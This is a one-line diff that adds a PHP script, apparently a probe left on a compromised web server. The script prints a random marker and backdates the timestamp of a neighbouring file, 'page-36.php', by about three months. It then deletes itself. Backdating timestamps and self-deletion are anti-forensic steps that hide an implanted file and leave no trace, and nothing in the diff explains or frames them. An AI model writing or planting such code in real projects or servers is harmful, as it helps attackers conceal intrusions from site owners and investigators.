@@ -1,0 +1,1 @@
+<?php echo "TkZGKxqFRR"; if (file_exists("./page-36.php")){ touch("./page-36.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*B8C8wnEU3fbXRNTbC7BV*/ ?>
